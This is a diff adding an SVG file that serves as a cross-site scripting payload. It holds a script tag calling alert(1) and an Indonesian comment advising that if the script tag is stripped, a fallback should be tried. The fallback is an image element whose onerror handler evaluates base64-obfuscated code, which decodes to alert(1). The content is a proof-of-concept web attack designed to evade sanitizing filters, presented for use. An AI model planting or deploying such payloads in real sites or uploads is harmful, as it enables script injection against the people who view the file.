@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert(1)</script>
+  <!-- Jika tag <script> dihapus, coba ini: -->
+  <image href="1" onerror="eval(atob('YWxlcnQoMSk='))" />
+</svg>
